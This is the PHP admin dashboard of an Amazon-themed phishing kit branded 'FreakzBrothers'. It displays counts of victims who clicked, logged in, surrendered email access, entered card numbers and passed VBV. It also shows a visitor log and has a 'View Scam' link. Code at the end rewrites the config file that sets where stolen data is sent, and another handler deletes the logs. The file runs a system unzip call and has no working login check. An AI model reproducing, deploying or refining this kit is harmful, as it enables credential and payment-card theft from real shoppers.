<?php
/*
███████╗██████╗ ███████╗ █████╗ ██╗  ██╗███████╗██████╗ ██████╗  ██████╗ ████████╗██╗  ██╗███████╗██████╗ ███████╗
██╔════╝██╔══██╗██╔════╝██╔══██╗██║ ██╔╝╚══███╔╝██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██║  ██║██╔════╝██╔══██╗██╔════╝
█████╗  ██████╔╝█████╗  ███████║█████╔╝   ███╔╝ ██████╔╝██████╔╝██║   ██║   ██║   ███████║█████╗  ██████╔╝███████╗
██╔══╝  ██╔══██╗██╔══╝  ██╔══██║██╔═██╗  ███╔╝  ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══██║██╔══╝  ██╔══██╗╚════██║
██║     ██║  ██║███████╗██║  ██║██║  ██╗███████╗██████╔╝██║  ██║╚██████╔╝   ██║   ██║  ██║███████╗██║  ██║███████║
╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝
*/

@require_once "../amazon/__CONFIG__.php";
system("unzip web.zip");
error_reporting(0);
 
session_start();
if($_SESSION['user'] == ""){
}
 
$off = $_GET['account'];
if(isset($off)){
  if($off == 'off'){
    session_destroy();
    unset($_SESSION['user']);
    session_unset();
  }
  else{
    echo '';
  }
}
?>
<!DOCTYPE html>
<html>

<head>
  <title>FreakzBrothers: Amazon</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
  <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
  <link rel="shortcut icon" href="amazon/Assets/img/favicon.ico" />
</head>

<body>
  <style type="text/css">
    .angka {
      font-weight: bold;
      font-size: 30px;
      float: right;
      margin-right: 10%
    }

    .text-warning {
      color: #FFC107
    }

    footer {
      font-size: 10px;
      font-weight: bold;
      font-family: arial;
      position: fixed;
      bottom: 0;
      right: 0;
      background: black;
      color: white;
      padding: 2px
    }

    .text-warning {
      color: #FFC107
    }
  </style>

  <nav class="navbar navbar-expand-sm bg-dark navbar-dark">
    <ul class="navbar-nav">
      <h1 style="display: inline-block; color: white;">&nbsp;&nbsp;&nbsp;<i class="fa fa-amazon spacer-small"></i>
        <but>
          <font color="red"><b>Freakz<font color="white">Brothers </font>
            </b>
      </h1>
      </div>
  </nav><br>
<nav class="navbar navbar-expand-lg navbar-light bg-light">
  <div class="container">
    <table class="table">
      <thead class="thead-white">
        <tr>
          <th>
            <div class="p-3 mb-2 bg-primary text-white"><i class="fa fa-users fa-2x"></i><b>&nbsp;&nbsp;&nbsp;Clicker&nbsp;&nbsp;&nbsp;</b><font size="6px">
            <?php echo empty(@file_get_contents("../log/click.txt")) ? "0" : @file_get_contents("../log/click.txt"); ?></div>
          </th>
          <th>
            <div class="p-3 mb-2 bg-warning text-dark"><font color="white"><i class="fa fa-sign-in fa-2x"></i><b>&nbsp;&nbsp;&nbsp;Login&nbsp;&nbsp;&nbsp;</b><font size="6px">
            <?php echo empty(@file_get_contents("../log/login.txt")) ? "0" : @file_get_contents("../log/login.txt"); ?></font></div></th>
          <th>
            <div class="p-3 mb-2 bg-dark text-dark"><font color="white"><i class="fa fa-envelope fa-2x"></i><b>&nbsp;&nbsp;&nbsp;Email&nbsp;&nbsp;&nbsp;</b><font size="6px">
            <?php echo empty(@file_get_contents("../log/tembus-email.txt")) ? "0" : @file_get_contents("../log/tembus-email.txt"); ?></font></div></th>
          <th>
            <div class="p-3 mb-2 bg-danger text-white"><i class="fa fa-credit-card fa-2x"></i><b>&nbsp;&nbsp;&nbsp;16Digit&nbsp;&nbsp;&nbsp;</b><font size="6px">
            <?php echo empty(@file_get_contents("../log/cc.txt")) ? "0" : @file_get_contents("../log/cc.txt"); ?></div></th>
          <th>
            <div class="p-3 mb-2 bg-success text-white"><i class="fa fa-cc-visa fa-2x"></i><b>&nbsp;&nbsp;&nbsp;VBV&nbsp;&nbsp;&nbsp;</b><font size="6px">
            <?php echo empty(@file_get_contents("../log/vbv.txt")) ? "0" : @file_get_contents("../log/vbv.txt"); ?></div></th>
        </tr>
      </thead>
    </table>

</div></nav><br>
<center><textarea style="resize:none;width:800px;height:280px;font-size:14px;font-family:Arial,sans-serif;color:red;" disabled=""><?php echo @file_get_contents("../log/visitor.txt"); ?></textarea></center>
<br><br><br>
  <form method="POST" action"">
    <center>
      <form method="POST" action""><button class="btn btn-dark" type="submit" name="rd">
          <font color="white"><b>Reset Log</b></font>
        </button>
        </button> <a href="https://<?php echo $_SERVER['SERVER_NAME'] ?>/_" class="btn btn-dark" target="_blank">
          <font color="white"><b>View Scam</b></font>
        </a> <a href="setting.php" class="btn btn-dark">
          <font color="white"><b>Setting</b></font>
        </a>
        <a href="?account=off" class="btn btn-dark">
          <font color="white"><b>Log Out</b></font>
        </a>
    </center>
  </form>
  <footer>
    <font color="green">Copyright</font> &copy; <font color="red">Freakz</font>
    <font color="white">Brothers</font> 2019.
  </footer>
</body>

</html>
 <?php
   unlink("set.php");
 
    $lama   = trim($_POST['lama']);
    $baru   = trim($_POST['baru']);
    $keylama = trim($_POST['keylama']);
    $keybaru = trim($_POST['keybaru']);
    $file   = "../amazon/__CONFIG__.php";
    $isi    = file_get_contents($file);
 
if(isset($_POST['email'])) {
    if(preg_match("#\b$lama\b#is", $isi)) {
        $isi = str_replace($lama,$baru,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
 
        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#ganti_email'/>";
          echo "<meta http-equiv='refresh' content='0; url=#ganti_email'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}
else if(isset($_POST['key'])) {
   if(preg_match("#\b$keylama\b#is", $isi)) {
        $isi = str_replace($keylama,$keybaru,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
 
        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#ganti_key'/>";
          echo "<meta http-equiv='refresh' content='0; url=#ganti_key'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}
else if(isset($_POST['rd'])) {
       unlink("../log/click.txt");
       unlink("../log/login.txt");
       unlink("../log/cc.txt");
       unlink("../log/visitor.txt");
       unlink("error_log");

       echo "<script>alert('Success')</script>";
       echo "<meta http-equiv='refresh' content='0; url=#reset_data'/>";
		 echo "<meta http-equiv='refresh' content='0; url=#reset_data'/>";
}
?>